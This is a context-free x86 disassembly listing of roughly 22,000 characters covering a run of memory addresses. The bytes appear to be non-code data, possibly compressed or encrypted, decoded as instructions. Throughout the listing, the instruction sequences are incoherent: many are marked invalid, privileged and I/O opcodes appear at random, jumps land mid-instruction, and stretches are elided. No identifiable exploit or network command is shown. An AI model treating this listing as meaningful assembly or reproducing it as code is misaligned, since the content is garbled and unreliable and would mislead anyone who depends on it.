  41c032:	add    eax,0x5902fc4
  41c037:	pushf  
  41c038:	xchg   edx,eax
  41c039:	seto   BYTE PTR [ecx+ebx*1+0x49]
  41c03e:	push   esp
  41c03f:	inc    ebp
  41c040:	stos   DWORD PTR es:[edi],eax
  41c041:	js     0x41c05e
  41c043:	aas    
  41c044:	jb     0x41c040
  41c046:	sbb    bl,BYTE PTR [eax-0x66]
  41c049:	and    al,BYTE PTR [edi-0x5f]
  41c04c:	or     al,0xee
  41c04e:	sub    BYTE PTR [ecx+0x65fa8c55],cl
  41c054:	inc    BYTE PTR [ecx-0x24ccea0a]
  41c05a:	ja     0x41c027
  41c05c:	and    eax,edi
  41c05e:	jbe    0x41c007
  41c060:	jne    0x41c03c
  41c062:	test   al,0x73
  41c064:	pop    edi
  41c065:	addr16 push ecx
  41c067:	int    0x12
  41c069:	jae    0x41c049
  41c06b:	push   es
  41c06c:	ins    BYTE PTR es:[edi],dx
  41c06d:	adc    al,0x7f
  41c06f:	jmp    0xc8ccb657
  41c074:	mov    cl,0xa9
  41c076:	dec    ebp
  41c077:	mov    ah,0x58
  41c079:	ds sbb eax,0x7358ab86
  41c07f:	sbb    eax,0x1dce8172
  41c084:	pop    es
  41c085:	add    BYTE PTR [esp+edi*2],ah
  41c088:	lock jnp 0x41c067
  41c08b:	xchg   esp,eax
  41c08c:	mov    edx,0x88d09374
  41c091:	xor    al,0xf7
  41c093:	mov    ebx,0xd0acf487
  41c098:	mov    edx,DWORD PTR [ebx-0x20]
  41c09b:	xor    al,BYTE PTR [edx-0x3b]
  41c09e:	sbb    BYTE PTR [ecx+0x7990631f],0x2f
  41c0a5:	test   DWORD PTR [ebx-0x7589ed71],eax
  41c0ab:	adc    edi,esi
  41c0ad:	mov    esi,0xb9b69a68
  41c0b2:	pop    eax
  41c0b3:	iret   
  41c0b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0b5:	pop    eax
  41c0b6:	lahf   
  41c0b7:	fcomp  DWORD PTR [esi]
  41c0b9:	scas   eax,DWORD PTR es:[edi]
  41c0ba:	popf   
  41c0bb:	sar    edx,cl
  41c0bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0be:	xor    ebp,ebx
  41c0c0:	clc    
  41c0c1:	cmp    cl,0x86
  41c0c4:	push   0xffffffd6
  41c0c6:	ins    BYTE PTR es:[edi],dx
  41c0c7:	inc    ecx
  41c0c8:	or     dl,ch
  41c0ca:	mov    ah,0x1d
  41c0cc:	into   
  41c0cd:	jmp    0x41c0d0
  41c0cf:	pop    edx
  41c0d0:	or     BYTE PTR [ebx],cl
  41c0d2:	enter  0xba88,0x36
  41c0d6:	mov    esi,0x6498d8fc
  41c0db:	pop    ss
  41c0dc:	mov    al,0xb9
  41c0de:	jle    0x41c0ab
  41c0e0:	daa    
  41c0e1:	push   ds
  41c0e2:	retf   0x205e
  41c0e5:	pop    esi
  41c0e6:	retf   
  41c0e7:	xor    BYTE PTR [eax],0x9e
  41c0ea:	push   es
  41c0eb:	mov    al,ah
  41c0ed:	adc    esi,DWORD PTR [ebp+0x65]
  41c0f0:	test   al,0x2e
  41c0f2:	cmp    ecx,DWORD PTR [eax-0xd]
  41c0f5:	loop   0x41c08b
  41c0f7:	outs   dx,DWORD PTR ds:[esi]
  41c0f8:	jbe    0x41c16f
  41c0fa:	xchg   ebx,eax
  41c0fb:	arpl   WORD PTR [eax],dx
  41c0fd:	(bad)  
  41c0fe:	popf   
  41c0ff:	and    edx,DWORD PTR [ebx+ecx*1]
  41c102:	or     eax,0xb934f0dd
  41c107:	push   ds
  41c108:	lds    ebp,FWORD PTR [ecx-0x4]
  41c10b:	dec    esi
  41c10c:	enter  0xc07f,0x9d
  41c110:	mov    BYTE PTR [eax],0x0
	...
  41c173:	add    cl,bl
  41c175:	dec    edx
  41c176:	mov    eax,ds:0xd9fbb3f8
  41c17b:	imul   edi,DWORD PTR ds:0xb5e90501,0xffffffe0
  41c182:	aam    0x44
  41c184:	(bad)
  41c188:	add    eax,0xba000001
  41c18d:	push   es
  41c18e:	pushf  
  41c18f:	das    
  41c190:	imul   ebp,DWORD PTR [ebp+eax*8-0x72c0ada5],0x0
  41c198:	in     eax,0x24
  41c19a:	and    BYTE PTR [ebx],dl
  41c19c:	arpl   WORD PTR ds:0xa7ab7626,sp
  41c1a2:	push   ebx
  41c1a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1a4:	stos   DWORD PTR es:[edi],eax
  41c1a5:	repnz mov dl,0xa6
  41c1a8:	aas    
  41c1a9:	pop    edi
  41c1aa:	js     0x41c1d5
  41c1ac:	mov    edi,0x46bf079a
  41c1b1:	fisubr WORD PTR [eax-0x734cd87b]
  41c1b7:	xchg   esp,ebp
  41c1b9:	adc    al,0x5b
  41c1bb:	mov    ch,0xf
  41c1bd:	ficom  DWORD PTR [ebp+0xa]
  41c1c0:	or     cl,BYTE PTR [eax-0x3312970b]
  41c1c6:	das    
  41c1c7:	inc    ebx
  41c1c8:	ret    
  41c1c9:	mov    eax,0x92d5bc9a
  41c1ce:	push   eax
  41c1cf:	lds    edi,FWORD PTR [ebp+0x6c]
  41c1d2:	into   
  41c1d3:	iret   
  41c1d4:	pop    ebp
  41c1d5:	int3   
  41c1d6:	outs   dx,BYTE PTR ds:[esi]
  41c1d7:	mov    ds:0x7633db53,eax
  41c1dc:	xor    BYTE PTR [eax+eax*4+0x30],al
  41c1e0:	lock mov bl,0x20
  41c1e3:	loope  0x41c1eb
  41c1e5:	lds    ecx,FWORD PTR [ebx+ebx*4]
  41c1e8:	cmp    ebp,DWORD PTR [eax+0x4f]
  41c1eb:	cli    
  41c1ec:	(bad)  
  41c1ed:	stos   BYTE PTR es:[edi],al
  41c1ee:	xchg   DWORD PTR [eax-0x4b],esi
  41c1f1:	or     al,0x7f
  41c1f3:	dec    esp
  41c1f4:	and    DWORD PTR [esi],ecx
  41c1f6:	sbb    eax,0xa57aff44
  41c1fb:	fdivp  st(0),st
  41c1fd:	(bad)  
  41c1fe:	mov    ch,0x8b
  41c200:	adc    DWORD PTR [edx+edi*1+0x15],esi
  41c204:	fmul   QWORD PTR [ecx]
  41c206:	(bad)  
  41c207:	fcom   DWORD PTR [ebx]
  41c209:	jo     0x41c1b1
  41c20b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c20c:	add    eax,0xeec5a153
  41c211:	jb     0x41c21c
  41c213:	xor    al,0xe6
  41c215:	test   eax,0x92271a36
  41c21a:	inc    ebx
  41c21b:	jno    0x41c23d
  41c21d:	repnz dec edx
  41c21f:	adc    BYTE PTR [edx],al
  41c221:	mov    edx,0x18852968
  41c226:	(bad)  
  41c227:	adc    BYTE PTR [ebx],bl
  41c229:	cmp    al,0x1a
  41c22b:	adc    DWORD PTR [ebx+0x15b7ee70],eax
  41c231:	idiv   ah
  41c233:	jge    0x41c21f
  41c235:	xchg   edi,eax
  41c236:	sub    eax,eax
  41c238:	dec    eax
  41c239:	cmp    al,BYTE PTR [ecx-0x14e86d1]
  41c23f:	scas   al,BYTE PTR es:[edi]
  41c240:	inc    esi
  41c241:	ffree  st(3)
  41c243:	mov    edx,0x96c0b62b
  41c248:	(bad)  
  41c249:	sbb    eax,0x29926165
  41c24e:	pop    ecx
  41c24f:	xor    BYTE PTR [esi+0x3a],0x9f
  41c253:	stos   BYTE PTR es:[edi],al
  41c254:	das    
  41c255:	jge    0x41c25a
  41c257:	sahf   
  41c258:	comiss xmm4,DWORD PTR [eax]
  41c25b:	add    DWORD PTR [eax],ebx
  41c25d:	ss clc 
  41c25f:	lahf   
  41c260:	lods   eax,DWORD PTR ds:[esi]
  41c261:	xor    DWORD PTR [esi],0x22
  41c264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c265:	sar    al,cl
  41c267:	fsubr  QWORD PTR [esi-0x60]
  41c26a:	and    ebx,DWORD PTR [esi+0x71fa404d]
  41c270:	mov    ebp,0x2fb704f1
  41c275:	lods   eax,DWORD PTR cs:[esi]
  41c277:	cli    
  41c278:	xchg   esp,eax
  41c279:	pop    edx
  41c27a:	rcr    BYTE PTR [edi-0x13],cl
  41c27d:	mov    al,fs:0x9c9e3288
  41c283:	ja     0x41c2f6
  41c285:	xor    BYTE PTR [eax],0xae
  41c288:	inc    eax
  41c289:	scas   al,BYTE PTR es:[edi]
  41c28a:	fsub   st(2),st
  41c28c:	lods   eax,DWORD PTR ds:[esi]
  41c28d:	pop    ebp
  41c28e:	aaa    
  41c28f:	sar    DWORD PTR [edi+0x0],0x0
	...
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	bound  esi,QWORD PTR [eax+0x49]
  41c303:	mov    DWORD PTR [ebx+ebp*1+0x1050001],edx
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	out    dx,eax
  41c30d:	int    0x4b
  41c30f:	xchg   esi,eax
  41c310:	pop    es
  41c311:	out    0xab,al
  41c313:	mov    BYTE PTR [edx-0xcfccf21],dl
  41c319:	call   0x8ebb71dc
  41c31e:	nop
  41c31f:	shr    BYTE PTR [edi-0xc],cl
  41c322:	xchg   ecx,eax
  41c323:	adc    al,0x7a
  41c325:	pop    esi
  41c326:	loope  0x41c2da
  41c328:	js     0x41c39e
  41c32a:	repz dec ebx
  41c32c:	push   cs
  41c32d:	fcmovnbe st,st(0)
  41c32f:	hlt    
  41c330:	das    
  41c331:	push   ebx
  41c332:	sbb    al,0xd5
  41c334:	mov    ah,0x5b
  41c336:	(bad)  
  41c337:	adc    al,0x4
  41c339:	push   es
  41c33a:	mov    esp,ds
  41c33c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c33d:	jle    0x41c2cb
  41c33f:	xchg   esp,eax
  41c340:	scas   al,BYTE PTR es:[edi]
  41c341:	loopne 0x41c3ba
  41c343:	pusha  
  41c344:	mov    dh,BYTE PTR [ecx]
  41c346:	or     ah,dh
  41c348:	ss cwde 
  41c34a:	add    eax,0x8839051d
  41c34f:	shl    BYTE PTR [ecx],cl
  41c351:	xchg   esp,eax
  41c352:	sar    DWORD PTR [ebp+0x7c],0x33
  41c356:	std    
  41c357:	push   0x887fd7b1
  41c35c:	push   eax
  41c35d:	mov    al,ds:0x9fc8b5b2
  41c362:	push   0xdb1a5afe
  41c367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c368:	aad    0x75
  41c36a:	dec    ebp
  41c36b:	ret    0x8b70
  41c36e:	(bad)  [edi-0x62495148]
  41c374:	loopne 0x41c3a7
  41c376:	mov    ebp,0xdf132795
  41c37b:	or     bh,al
  41c37d:	mov    ds:0x5c961ef,eax
  41c382:	jl     0x41c313
  41c384:	into   
  41c385:	xchg   edx,eax
  41c386:	cmp    BYTE PTR [esp+edi*2+0x6eb4b31b],bh
  41c38d:	ror    DWORD PTR [ebx+eax*1],0x5
  41c391:	dec    ecx
  41c392:	mov    ah,0xec
  41c394:	je     0x41c361
  41c396:	addr16 push ebx
  41c398:	loopne 0x41c3fa
  41c39a:	mov    esi,0x5cb9ddcf
  41c39f:	ss jp  0x41c3bd
  41c3a2:	mov    gs,esp
  41c3a4:	das    
  41c3a5:	adc    BYTE PTR [ebx+0x15],dh
  41c3a8:	cmc    
  41c3a9:	xchg   ebp,eax
  41c3aa:	cmc    
  41c3ab:	mov    edi,0xfe085d94
  41c3b0:	pop    eax
  41c3b1:	xor    bh,BYTE PTR [esi-0x10fe1b62]
  41c3b7:	std    
  41c3b8:	mov    dh,0x52
  41c3ba:	and    al,0xeb
  41c3bc:	mov    ch,0xc3
  41c3be:	mov    ebx,0x52e8b1ce
  41c3c3:	mov    bl,0x7c
  41c3c5:	sahf   
  41c3c6:	cli    
  41c3c7:	imul   ebx,DWORD PTR [esi+ebp*2+0x46],0xffffffc7
  41c3cc:	std    
  41c3cd:	scas   al,BYTE PTR es:[edi]
  41c3ce:	int    0x38
  41c3d0:	ins    DWORD PTR es:[edi],dx
  41c3d1:	xor    eax,0x7e49ab3
  41c3d6:	push   ds
  41c3d7:	int    0x3a
  41c3d9:	(bad)  
  41c3da:	aas    
  41c3db:	dec    ebx
  41c3dc:	jne    0x41c423
  41c3de:	dec    edx
  41c3df:	out    dx,eax
  41c3e0:	js     0x41c363
  41c3e2:	test   BYTE PTR [esi],bl
  41c3e4:	push   ebp
  41c3e5:	and    bh,BYTE PTR [esp+eax*8]
  41c3e8:	adc    DWORD PTR [esi+0x75],0x9d946629
  41c3ef:	clc    
  41c3f0:	je     0x41c43f
  41c3f2:	les    esi,FWORD PTR [eax*8-0x3ad47b95]
  41c3f9:	push   ebp
  41c3fa:	mov    ebp,0xbacf3cfb
  41c3ff:	popa   
  41c400:	mov    ds:0xc186e550,eax
  41c405:	adc    BYTE PTR [esi],dl
  41c407:	sahf   
  41c408:	or     DWORD PTR [esi],edi
  41c40a:	mov    edx,0x21b9e5ca
  41c40f:	sbb    eax,DWORD PTR [ebx]
	...
  41c471:	add    BYTE PTR [eax],al
  41c473:	add    BYTE PTR [ebx+0x20],dl
  41c476:	mov    al,ds:0x5faef3ae
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	retf   0x7c63
  41c483:	addr16 cdq 
  41c485:	sub    al,0x1
  41c487:	add    BYTE PTR ds:0x36000001,al
  41c48d:	icebp  
  41c48e:	es popa 
  41c490:	pop    esi
  41c491:	push   0xfb2585fc
  41c496:	mov    ch,0xe1
  41c498:	xlat   BYTE PTR ds:[ebx]
  41c499:	jb     0x41c455
  41c49b:	imul   edi,DWORD PTR [edx],0x1c494d3b
  41c4a1:	jl     0x41c520
  41c4a3:	js     0x41c4d5
  41c4a5:	inc    edi
  41c4a6:	mov    bh,0x5e
  41c4a8:	jo     0x41c45b
  41c4aa:	mov    ecx,DWORD PTR [edx-0x72de2820]
  41c4b0:	dec    esp
  41c4b1:	daa    
  41c4b2:	fs ja  0x41c466
  41c4b5:	scas   eax,DWORD PTR es:[edi]
  41c4b6:	xchg   esp,eax
  41c4b7:	neg    esi
  41c4b9:	jb     0x41c52a
  41c4bb:	loopne 0x41c512
  41c4bd:	sbb    DWORD PTR [esi],0x635415aa
  41c4c3:	jmp    0x41c4d1
  41c4c5:	sbb    eax,0x2f1ef374
  41c4ca:	push   es
  41c4cb:	sbb    BYTE PTR [esi-0x28dc67aa],ch
  41c4d1:	out    dx,al
  41c4d2:	mov    ebp,0x32a7ae6d
  41c4d7:	mov    ah,0xcd
  41c4d9:	mov    ecx,0xbf319d4f
  41c4de:	jb     0x41c533
  41c4e0:	jb     0x41c471
  41c4e2:	push   edx
  41c4e3:	pusha  
  41c4e4:	cld    
  41c4e5:	xchg   BYTE PTR [ecx],dl
  41c4e7:	adc    eax,0xc8a8d717
  41c4ec:	mov    eax,0x5251bade
  41c4f1:	mov    bh,0xff
  41c4f3:	ss dec ecx
  41c4f5:	(bad)  
  41c4f6:	rcr    DWORD PTR gs:[esi-0x50],1
  41c4fa:	sbb    eax,0xc1ab26aa
  41c4ff:	lods   al,BYTE PTR ds:[esi]
  41c500:	in     al,0xf9
  41c502:	leave  
  41c503:	mov    bh,0x6e
  41c505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c506:	out    dx,al
  41c507:	sti    
  41c508:	mov    eax,ds:0x1c81bd02
  41c50d:	dec    edi
  41c50e:	xchg   ebx,eax
  41c50f:	inc    ebx
  41c510:	popf   
  41c511:	xchg   DWORD PTR [ecx],esp
  41c513:	xchg   esp,eax
  41c514:	fldenv [edi]
  41c516:	dec    esi
  41c517:	adc    bl,BYTE PTR [ecx]
  41c519:	aaa    
  41c51a:	test   BYTE PTR [esi+eax*8],dh
  41c51d:	je     0x41c4aa
  41c51f:	pop    eax
  41c520:	push   0x22
  41c522:	test   al,0x8d
  41c524:	ret    
  41c525:	sbb    DWORD PTR gs:[esi],ecx
  41c528:	sub    edi,DWORD PTR [ebx-0x14]
  41c52b:	jbe    0x41c5a7
  41c52d:	sub    eax,DWORD PTR [ebx+0x30]
  41c530:	out    dx,eax
  41c531:	mov    edi,0x679a8149
  41c536:	scas   al,BYTE PTR es:[edi]
  41c537:	xor    ebp,DWORD PTR [ecx+0x4e4a01f7]
  41c53d:	ins    BYTE PTR es:[edi],dx
  41c53e:	nop
  41c53f:	xor    bh,dl
  41c541:	jmp    DWORD PTR [ebx+0x22]
  41c544:	lar    ecx,WORD PTR [esi+ebx*1]
  41c548:	and    ebx,edx
  41c54a:	add    bh,BYTE PTR [ebp+ebp*1+0x5a]
  41c54e:	or     al,0x3e
  41c550:	adc    BYTE PTR [eax],dl
  41c552:	sbb    dl,BYTE PTR [ecx+0x76]
  41c555:	int3   
  41c556:	xchg   ebp,eax
  41c557:	inc    esp
  41c558:	cld    
  41c559:	retf   
  41c55a:	or     DWORD PTR [edi+eiz*2-0xe82f206],esi
  41c561:	(bad)  
  41c562:	hlt    
  41c563:	adc    al,0x9a
  41c565:	jo     0x41c5c8
  41c567:	and    DWORD PTR [eax+ebx*4],0x60771c59
  41c56e:	push   edi
  41c56f:	bound  edx,QWORD PTR [ebp-0x1a9246f3]
  41c575:	and    eax,0xafb81a5e
  41c57a:	or     al,0xc
  41c57c:	mov    ebp,0x9934cb74
  41c581:	stos   BYTE PTR es:[edi],al
  41c582:	add    eax,0x92356745
  41c587:	jge    0x41c5d3
  41c589:	adc    BYTE PTR [ecx+0x5b],ah
  41c58c:	sbb    esi,DWORD PTR [eax-0x5b]
  41c58f:	mov    ecx,DWORD PTR [eax+eax*1+0x0]
	...
  41c5f2:	add    BYTE PTR [eax],al
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0x54301773
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0xfb000001
  41c60d:	jl     0x41c66d
  41c60f:	mov    al,0x46
  41c611:	jb     0x41c5d0
  41c613:	mov    al,0xdb
  41c615:	dec    esi
  41c616:	add    eax,0x89eafaf3
  41c61b:	aam    0xa3
  41c61d:	out    dx,al
  41c61e:	rol    BYTE PTR [edi+esi*2-0x326d12ee],1
  41c625:	mov    ebx,0x8490a586
  41c62a:	mov    ebx,0x9b5a457f
  41c62f:	inc    esp
  41c630:	and    ebp,DWORD PTR [edx]
  41c632:	or     al,0x38
  41c634:	and    DWORD PTR [edx+0xa40aef9],edi
  41c63a:	pop    es
  41c63b:	mov    ch,0x27
  41c63d:	ret    
  41c63e:	cwde   
  41c63f:	in     eax,0x1b
  41c641:	mov    al,0x2d
  41c643:	sub    dl,BYTE PTR [edx]
  41c645:	xchg   ebp,eax
  41c646:	sub    DWORD PTR [ebp-0x79899bf0],ebp
  41c64c:	or     eax,DWORD PTR [ecx-0x63]
  41c64f:	lahf   
  41c650:	push   ebp
  41c651:	mov    dl,BYTE PTR [eax+ecx*2-0x3ec2feca]
  41c658:	inc    ebx
  41c659:	dec    esp
  41c65a:	rcr    BYTE PTR [eax+0x34638e32],cl
  41c660:	dec    ebx
  41c661:	mov    eax,ds:0xfdbbfc9a
  41c666:	stos   BYTE PTR es:[edi],al
  41c667:	inc    esi
  41c668:	push   ss
  41c669:	pushf  
  41c66a:	add    eax,0x600aac31
  41c66f:	add    dl,BYTE PTR [edx+0x17c6a999]
  41c675:	cmp    al,0xa5
  41c677:	test   DWORD PTR [di-0x2aad],edi
  41c67c:	sbb    eax,0x9531bf0
  41c681:	push   cs
  41c682:	push   ds
  41c683:	(bad)  
  41c684:	jecxz  0x41c655
  41c686:	jnp    0x41c6a7
  41c688:	mov    eax,0xf7c5e132
  41c68d:	lds    edx,FWORD PTR [ecx]
  41c68f:	ret    
  41c690:	inc    eax
  41c691:	xor    ecx,DWORD PTR [ecx-0x7f122e17]
  41c697:	and    DWORD PTR [edi],ecx
  41c699:	jo     0x41c6a5
  41c69b:	xor    cl,BYTE PTR [edi]
  41c69d:	in     eax,0x6f
  41c69f:	std    
  41c6a0:	xchg   esp,eax
  41c6a1:	out    dx,eax
  41c6a2:	test   ah,bl
  41c6a4:	or     eax,0xc6785354
  41c6a9:	lahf   
  41c6aa:	pop    ax
  41c6ac:	je     0x41c676
  41c6ae:	arpl   di,ax
  41c6b0:	sub    esi,DWORD PTR [edi-0x6eb7949c]
  41c6b6:	mov    cs,WORD PTR [ecx]
  41c6b8:	sub    BYTE PTR [esi+0x4],dh
  41c6bb:	adc    al,0x72
  41c6bd:	daa    
  41c6be:	test   dl,bl
  41c6c0:	sub    bl,BYTE PTR [eax]
  41c6c2:	fimul  WORD PTR [edi+edx*2-0xd547fe9]
  41c6c9:	jge    0x41c6ab
  41c6cb:	stos   BYTE PTR es:[edi],al
  41c6cc:	push   es
  41c6cd:	cwde   
  41c6ce:	iret   
  41c6cf:	in     eax,dx
  41c6d0:	or     al,BYTE PTR [esi-0x6d]
  41c6d3:	lods   eax,DWORD PTR ds:[esi]
  41c6d4:	sahf   
  41c6d5:	(bad)  
  41c6d6:	jmp    0x41c6e2
  41c6d8:	pusha  
  41c6d9:	in     al,0x32
  41c6db:	xor    al,0x7c
  41c6dd:	add    BYTE PTR [eax-0x1f],dh
  41c6e0:	add    al,0x80
  41c6e2:	scas   eax,DWORD PTR es:[edi]
  41c6e3:	es pop edx
  41c6e5:	clc    
  41c6e6:	imul   DWORD PTR [eax-0x37]
  41c6e9:	addr16 mov esi,0x2e201307
  41c6ef:	or     bh,BYTE PTR [edx-0x7b]
  41c6f2:	pop    es
  41c6f3:	dec    esi
  41c6f4:	iret   
  41c6f5:	jg     0x41c6f8
  41c6f7:	pop    es
  41c6f8:	pushf  
  41c6f9:	imul   ebx,DWORD PTR [edi-0x77855d16],0xfffffff0
  41c700:	push   es
  41c701:	pop    edi
  41c702:	data16 shl BYTE PTR [edi+0x6],cl
  41c706:	ds jmp 0x8820:0xbc82c339
  41c70e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c70f:	jae    0x41c77b
	...
  41c771:	add    BYTE PTR [eax],al
  41c773:	add    dl,bl
  41c775:	add    edx,eax
  41c777:	xchg   bl,bl
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	pop    eax
  41c781:	mov    ds:0x2ea368e5,eax
  41c786:	add    DWORD PTR [eax],eax
  41c788:	add    eax,0xb6000001
  41c78d:	test   WORD PTR [eax+0x63],bp
  41c791:	sub    bh,al
  41c793:	push   edi
  41c794:	push   ss
  41c795:	nop
  41c796:	das    
  41c797:	mov    bh,BYTE PTR [ebp-0x24]
  41c79a:	fcmovnbe st,st(6)
  41c79c:	cmp    DWORD PTR [ecx+ecx*8],esp
  41c79f:	push   ecx
  41c7a0:	scas   al,BYTE PTR es:[edi]
  41c7a1:	jae    0x41c7c3
  41c7a3:	xchg   edx,eax
  41c7a4:	xchg   edi,eax
  41c7a5:	xchg   ecx,eax
  41c7a6:	pusha  
  41c7a7:	push   ebx
  41c7a8:	mov    ch,BYTE PTR [ecx+0x2b23352e]
  41c7ae:	jecxz  0x41c813
  41c7b0:	popa   
  41c7b1:	xchg   DWORD PTR [edi+0x5a],edi
  41c7b4:	xchg   ebx,eax
  41c7b5:	stos   DWORD PTR es:[edi],eax
  41c7b6:	frstor cs:0x9802462c
  41c7bd:	stos   BYTE PTR es:[edi],al
  41c7be:	xchg   DWORD PTR [edx+eax*2],esp
  41c7c1:	out    0x40,eax
  41c7c3:	rcr    BYTE PTR [esi],cl
  41c7c5:	arpl   WORD PTR [esi],cx
  41c7c7:	ret    
  41c7c8:	rcr    BYTE PTR [ebp-0x109b2d25],cl
  41c7ce:	ja     0x41c7bf
  41c7d0:	call   0x6c3d:0x9ce49a14
  41c7d7:	dec    ebx
  41c7d8:	lods   al,BYTE PTR ds:[esi]
  41c7d9:	jnp    0x41c84c
  41c7db:	std    
  41c7dc:	call   0x95446eb
  41c7e1:	mov    esi,0x8818ae23
  41c7e6:	mov    esp,0xa45c308d
  41c7eb:	jnp    0x41c811
  41c7ed:	pop    es
  41c7ee:	cdq    
  41c7ef:	stos   BYTE PTR es:[edi],al
  41c7f0:	add    ah,BYTE PTR fs:[ebp-0x7d]
  41c7f4:	add    dl,ch
  41c7f6:	retf   0x6a2e
  41c7f9:	and    bl,BYTE PTR [ebx+edx*8]
  41c7fc:	mov    esi,esp
  41c7fe:	ja     0x41c7bf
  41c800:	xlat   BYTE PTR ds:[ebx]
  41c801:	je     0x41c7a9
  41c803:	ja     0x41c81c
  41c805:	retf   
  41c806:	cmp    BYTE PTR [ebp+edi*1+0x59230423],al
  41c80d:	mov    bh,BYTE PTR [eax+eax*2]
  41c810:	jmp    edi
  41c812:	rcr    DWORD PTR [edi-0x4ee9a5d4],1
  41c818:	mov    ch,0x2e
  41c81a:	jp     0x41c7be
  41c81c:	mov    esp,0x5e7cc67d
  41c821:	mov    DWORD PTR ds:0xcb753bd8,ecx
  41c827:	mov    WORD PTR [esi-0x4e],es
  41c82a:	ins    BYTE PTR es:[edi],dx
  41c82b:	fld    DWORD PTR [esi]
  41c82d:	inc    esp
  41c82e:	jb     0x41c814
  41c830:	push   cs
  41c831:	or     ah,BYTE PTR [ebx+edx*2]
  41c834:	fnclex 
  41c836:	ror    DWORD PTR [ebx-0x73],cl
  41c839:	jmp    0x818e:0x57d06c8d
  41c840:	and    eax,0xe42d4a4f
  41c845:	mov    dh,0x62
  41c847:	pop    ebp
  41c848:	inc    ebp
  41c849:	jbe    0x41c7fe
  41c84b:	adc    edx,DWORD PTR [edx+0x2c]
  41c84e:	push   esp
  41c84f:	ins    DWORD PTR es:[edi],dx
  41c850:	aam    0xd1
  41c852:	pushf  
  41c853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c855:	scas   eax,DWORD PTR es:[edi]
  41c856:	mov    esi,0x17279ce7
  41c85b:	push   ebx
  41c85c:	mov    ds:0x580db472,eax
  41c861:	xor    cl,0x62
  41c864:	aad    0x92
  41c866:	hlt    
  41c867:	push   ss
  41c868:	push   cs
  41c869:	test   DWORD PTR [eax-0x5f1e192f],ecx
  41c86f:	pusha  
  41c870:	ds pushf 
  41c872:	mov    al,0xf6
  41c874:	aam    0xec
  41c876:	inc    edi
  41c877:	sti    
  41c878:	ss test esi,eax
  41c87b:	leave  
  41c87c:	pop    si
  41c87e:	int3   
  41c87f:	jne    0x41c8d1
  41c881:	(bad)  
  41c882:	jecxz  0x41c8cd
  41c884:	bound  edx,QWORD PTR [edi+0x7d]
  41c887:	sub    esp,ebx
  41c889:	addr16 mov eax,ds:0x3dbe
  41c88d:	sbb    DWORD PTR [edi-0x58],0xffffff9a
	...
  41c8f1:	add    BYTE PTR [eax],al
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	cwde   
  41c901:	or     esp,DWORD PTR [esi+0x12fa8e5]
  41c907:	add    BYTE PTR ds:0x56000001,al
  41c90d:	ins    DWORD PTR es:[edi],dx
  41c90e:	es iret 
  41c910:	in     al,0x48
  41c912:	and    eax,0x6c01122e
  41c917:	xor    ch,dh
  41c919:	add    BYTE PTR [esi+0x12],al
  41c91c:	adc    eax,0x953e1e38
  41c921:	loope  0x41c957
  41c923:	cmp    bl,BYTE PTR [ebp+0x5edca84b]
  41c929:	pop    ss
  41c92a:	fldenv ds:0x422a
  41c92f:	(bad)  
  41c930:	or     eax,0xd1f2f504
  41c935:	mov    eax,0x7d374317
  41c93a:	mov    ch,0x22
  41c93c:	mov    ds:0x767495ee,eax
  41c941:	pop    edx
  41c942:	loop   0x41c990
  41c944:	imul   BYTE PTR [edx-0x2f8bc0a4]
  41c94a:	dec    esi
  41c94b:	lea    ecx,[eax+0x1e]
  41c94e:	mov    eax,0x6e1cc07b
  41c953:	or     BYTE PTR [ecx],cl
  41c955:	mov    ch,0xf1
  41c957:	inc    esp
  41c958:	inc    ebp
  41c959:	jp     0x41c9af
  41c95b:	daa    
  41c95c:	imul   ecx,esp,0xffffffd9
  41c95f:	in     al,0x2
  41c961:	int3   
  41c962:	push   cs
  41c963:	out    dx,eax
  41c964:	sbb    DWORD PTR [eax+0x46],0xf170e53f
  41c96b:	jns    0x41c98d
  41c96d:	xor    bh,BYTE PTR [eax-0x4c]
  41c970:	stos   DWORD PTR es:[edi],eax
  41c971:	repnz or ah,BYTE PTR [ebx+0x7f91958d]
  41c978:	xlat   BYTE PTR ds:[ebx]
  41c979:	jecxz  0x41c9bb
  41c97b:	push   esp
  41c97c:	push   ebx
  41c97d:	fdivr  st,st(6)
  41c97f:	mov    eax,ds:0x13d1742a
  41c984:	cld    
  41c985:	neg    BYTE PTR [esi+0x2f8ad708]
  41c98b:	inc    esp
  41c98c:	dec    edx
  41c98d:	es out dx,eax
  41c98f:	repnz mov dl,0x70
  41c992:	pop    edx
  41c993:	xchg   esp,eax
  41c994:	inc    edi
  41c995:	push   ebx
  41c996:	leave  
  41c997:	jp     0x41c9cf
  41c999:	jne    0x41ca0f
  41c99b:	dec    ebp
  41c99c:	pushf  
  41c99d:	mov    dh,BYTE PTR [edx-0x14]
  41c9a0:	xchg   esi,eax
